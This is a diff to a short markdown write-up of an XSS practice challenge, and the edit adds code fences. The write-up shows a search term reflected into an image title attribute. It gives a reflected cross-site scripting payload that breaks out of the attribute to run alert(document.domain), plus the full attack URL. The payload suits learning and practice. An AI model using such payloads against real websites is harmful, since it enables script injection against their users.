@@ -35,16 +35,18 @@ http://2.challenge.xss.site/search.php?term=example
 
 Looking in the source code you will find the term reflected as below.
 
+```
 <img src="images/404.png" title="example">
+```
 
 To show the alert box we need send the follow payload.
 
+```
 "><img src=1 onerror="alert(document.domain)
+```
 
 Just add the payload to the search url replacing your search term.
 
+```
 http://2.challenge.xss.site/search.php?term="><img hidden src=1 onerror="alert(document.domain)
-
-
-
-
+```
